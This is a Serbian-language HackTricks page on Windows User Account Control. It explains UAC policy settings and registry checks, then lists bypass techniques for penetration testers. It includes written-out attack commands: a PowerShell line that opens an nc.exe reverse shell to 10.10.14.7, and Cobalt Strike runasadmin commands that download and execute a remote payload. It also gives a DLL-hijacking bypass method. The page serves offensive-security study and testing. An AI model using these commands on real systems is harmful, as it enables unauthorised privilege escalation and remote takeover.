# UAC - User Account Control

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete tokove rada** pokretane najnaprednijim alatima zajednice na svetu.\
Pristupite danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **zahtev za odobrenje za povišene aktivnosti**. Aplikacije imaju različite `integritetne` nivoe, a program sa **visokim nivoom** može obavljati zadatke koji **potencijalno mogu ugroziti sistem**. Kada je UAC omogućen, aplikacije i zadaci uvek **se izvršavaju pod sigurnosnim kontekstom naloga koji nije administrator** osim ako administrator eksplicitno ne odobri tim aplikacijama/zadacima pristup nivou administratora da bi se izvršavali. To je funkcija koja štiti administratore od nenamernih promena, ali se ne smatra sigurnosnom granicom.

Za više informacija o nivoima integriteta:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Kada je UAC na snazi, administratoru je dodeljeno 2 tokena: standardni korisnički ključ, za obavljanje redovnih radnji na običnom nivou, i jedan sa administratorskim privilegijama.

Ova [stranica](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) detaljno opisuje kako UAC funkcioniše i uključuje proces prijavljivanja, korisničko iskustvo i arhitekturu UAC-a. Administratori mogu koristiti sigurnosne politike da konfigurišu kako UAC funkcioniše specifično za njihovu organizaciju na lokalnom nivou (koristeći secpol.msc), ili konfigurisati i distribuirati putem Group Policy Objects (GPO) u okruženju Active Directory domena. Različite postavke su detaljno opisane [ovde](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Postoje 10 postavki Group Policy-ja koje se mogu postaviti za UAC. Sledeća tabela pruža dodatne detalje:

| Postavka Group Policy-ja                                                                                                                                                                                                                                                                                                                                                       | Registry ključ              | Podrazumevano podešavanje                                                            |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Isključeno                                                                           |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Isključeno                                                                           |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Zahtev za odobrenje za ne-Windows binarne datoteke                                   |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Zahtev za akreditive na sigurnom desktopu                                            |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Omogućeno (podrazumevano za kućne korisnike) Isključeno (podrazumevano za preduzeća) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Isključeno                                                                           |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Omogućeno                                                                            |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Omogućeno                                                                            |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Omogućeno                                                                            |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Omogućeno                                                                            |
| ### Teorija UAC Bypass-a                                                                                                                                                                                                                                                                                                                                                       |                             |                                                                                      |

Neke programe **automatski podižu** ako **korisnik pripada** grupi **administratora**. Ovi binarni fajlovi imaju unutar svog _**Manifesta**_ opciju _**autoElevate**_ sa vrednošću _**True**_. Binarni fajl takođe mora biti **potpisan od strane Microsoft-a**.

Zatim, da bi se **zaobišao** **UAC** (podigao sa **srednjeg** nivoa integriteta na **visoki**) neki napadači koriste ovakve binarne fajlove da bi **izvršili proizvoljni kod** jer će biti izvršen iz **procesa visokog nivoa integriteta**.

Možete **proveriti** _**Manifest**_ binarnog fajla koristeći alat _**sigcheck.exe**_ iz Sysinternals-a. I možete **videti** nivo **integriteta** procesa koristeći _Process Explorer_ ili _Process Monitor_ (iz Sysinternals-a).

### Provera UAC-a

Da biste potvrdili da li je UAC omogućen uradite:

```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```

Ako je **`1`**, onda je UAC **aktiviran**, ako je **`0`** ili **ne postoji**, onda je UAC **neaktivan**.

Zatim, proverite **koji nivo** je konfigurisan:

```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

* Ako je **`0`** onda, UAC neće tražiti potvrdu (kao **isključeno**)
* Ako je **`1`** administratoru se **traži korisničko ime i lozinka** da bi izvršio binarni fajl sa visokim privilegijama (na Secure Desktop-u)
* Ako je **`2`** (**Uvek me obaveštavaj**) UAC će uvek tražiti potvrdu od administratora kada pokuša da izvrši nešto sa visokim privilegijama (na Secure Desktop-u)
* Ako je **`3`** kao `1` ali nije neophodno na Secure Desktop-u
* Ako je **`4`** kao `2` ali nije neophodno na Secure Desktop-u
* Ako je **`5`** (**podrazumevano**) tražiće potvrdu od administratora da pokrene ne-Windows binarne fajlove sa visokim privilegijama

Zatim, treba da pogledate vrednost **`LocalAccountTokenFilterPolicy`**\
Ako je vrednost **`0`**, tada samo korisnik sa **RID 500** (**ugrađeni Administrator**) može obavljati **administratorske zadatke bez UAC-a**, a ako je `1`, **svi nalozi unutar grupe "Administratori"** to mogu uraditi.

I, na kraju pogledajte vrednost ključa **`FilterAdministratorToken`**\
Ako je **`0`** (podrazumevano), **ugrađeni administratorski nalog može** obavljati zadatke udaljene administracije, a ako je **`1`** ugrađeni administratorski nalog **ne može** obavljati zadatke udaljene administracije, osim ako je `LocalAccountTokenFilterPolicy` postavljen na `1`.

#### Rezime

* Ako je `EnableLUA=0` ili **ne postoji**, **nema UAC-a za bilo koga**
* Ako je `EnableLua=1` i **`LocalAccountTokenFilterPolicy=1`, Nema UAC-a za bilo koga**
* Ako je `EnableLua=1` i **`LocalAccountTokenFilterPolicy=0` i `FilterAdministratorToken=0`, Nema UAC-a za RID 500 (Ugrađeni Administrator)**
* Ako je `EnableLua=1` i **`LocalAccountTokenFilterPolicy=0` i `FilterAdministratorToken=1`, UAC za sve**

Sve ove informacije mogu se prikupiti koristeći **metasploit** modul: `post/windows/gather/win_privs`

Takođe možete proveriti grupe vašeg korisnika i dobiti nivo integriteta:

```
net user %username%
whoami /groups | findstr Level
```

## UAC zaobilaženje

{% hint style="info" %}
Imajte na umu da ako imate grafički pristup žrtvi, UAC zaobilaženje je jednostavno jer jednostavno možete kliknuti na "Da" kada se pojavi UAC prozor.
{% endhint %}

UAC zaobilaženje je potrebno u sledećoj situaciji: **UAC je aktiviran, vaš proces se izvršava u kontekstu srednje integriteta, a vaš korisnik pripada grupi administratora**.

Važno je napomenuti da je **mnogo teže zaobići UAC ako je postavljen na najviši nivo sigurnosti (Uvek) nego ako je postavljen na bilo koji od drugih nivoa (Podrazumevano)**.

### UAC onemogućen

Ako je UAC već onemogućen (`ConsentPromptBehaviorAdmin` je **`0`**), možete **izvršiti reverznu ljusku sa administratorskim privilegijama** (visok nivo integriteta) koristeći nešto poput:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC zaobilaženje sa duplikacijom tokena

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Veoma** osnovno UAC "zaobilaženje" (potpisti pristup sistemu datoteka)

Ako imate shell sa korisnikom koji je unutar grupe Administratora, možete **montirati C$** deljeni putem SMB (sistem datoteka) lokalno na novi disk i imaćete **pristup svemu unutar sistema datoteka** (čak i folderu kuće Administratora).

{% hint style="warning" %}
**Izgleda da ovaj trik više ne funkcioniše**
{% endhint %}

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### UAC zaobilaženje pomoću cobalt strike-a

Cobalt Strike tehnike će raditi samo ako UAC nije postavljen na maksimalni nivo bezbednosti

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** i **Metasploit** takođe imaju nekoliko modula za **bypass** **UAC**.

### KRBUACBypass

Dokumentacija i alat na [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass eksploatacije

[**UACME**](https://github.com/hfiref0x/UACME) koji je **kompilacija** nekoliko UAC bypass eksploatacija. Imajte na umu da će vam biti potrebno **kompajlirati UACME pomoću visual studija ili msbuild-a**. Kompilacija će kreirati nekoliko izvršnih datoteka (kao što su `Source\Akagi\outout\x64\Debug\Akagi.exe`), moraćete znati **koja vam je potrebna**.\
Trebalo bi da **budete oprezni** jer će neki bypassi **pokrenuti neke druge programe** koji će **upozoriti** **korisnika** da se nešto dešava.

UACME ima **verziju izgradnje od koje je svaka tehnika počela da radi**. Možete pretražiti tehniku koja utiče na vaše verzije:

```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

### Više UAC zaobilazaka

**Sve** tehnike korišćene ovde za zaobilaženje UAC **zahtevaju** potpunu interaktivnu ljusku sa žrtvom (obična nc.exe ljuska nije dovoljna).

Možete dobiti korišćenjem **meterpreter** sesije. Migrirajte na **proces** koji ima vrednost **Session** jednaku **1**:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ bi trebalo da radi)

### UAC zaobilaženje sa GUI

Ako imate pristup **GUI možete jednostavno prihvatiti UAC prozor** kada se pojavi, zaista vam nije potreban zaobilazak. Dakle, pristup GUI-ju će vam omogućiti da zaobiđete UAC.

Štaviše, ako dobijete GUI sesiju koju je neko koristio (potencijalno putem RDP-a) postoje **neki alati koji će se izvršavati kao administrator** odakle biste mogli **pokrenuti** na primer **cmd** kao admin direktno bez ponovnog dobijanja UAC upita kao što je [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Ovo može biti malo **skrivenije**.

### Bučni brute-force UAC zaobilazak

Ako vam nije stalo do buke uvek možete **pokrenuti nešto poput** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) što **traži privilegije za podizanje dok korisnik ne prihvati**.

### Vaš sopstveni zaobilazak - Osnovna metodologija zaobilaska UAC-a

Ako pogledate **UACME** primetićete da **većina UAC zaobilazaka zloupotrebljava Dll Hijacking vulnerabilit**y (uglavnom pisanje zlonamernog dll-a na _C:\Windows\System32_). [Pročitajte ovo da biste naučili kako da pronađete Dll Hijacking vulnerabilitet](../windows-local-privilege-escalation/dll-hijacking/).

1. Pronađite binarni fajl koji će se **autoelevate** (proverite da kada se izvrši radi na visokom nivou integriteta).
2. Pomoću procmon-a pronađite "**NAME NOT FOUND**" događaje koji mogu biti ranjivi na **DLL Hijacking**.
3. Verovatno ćete morati da **napišete** DLL unutar nekih **zaštićenih putanja** (kao što je C:\Windows\System32) gde nemate dozvole za pisanje. To možete zaobići koristeći:
4. **wusa.exe**: Windows 7, 8 i 8.1. Omogućava izvlačenje sadržaja CAB fajla unutar zaštićenih putanja (jer se ovaj alat izvršava sa visokog nivoa integriteta).
5. **IFileOperation**: Windows 10.
6. Pripremite **skriptu** za kopiranje vašeg DLL-a unutar zaštićene putanje i izvršite ranjivi i autoelevated binarni fajl.

### Još jedna tehnika zaobilaska UAC-a

Sastoji se u praćenju da li se **autoElevated binarni fajl** pokušava **čitati** iz **registra** ime/putanja **binarnog fajla** ili **komande** koja će biti **izvršena** (ovo je interesantnije ako binarni fajl traži ove informacije unutar **HKCU**).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete tokove rada** pokretane najnaprednijim alatima zajednice na svetu.\
Pristupite danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
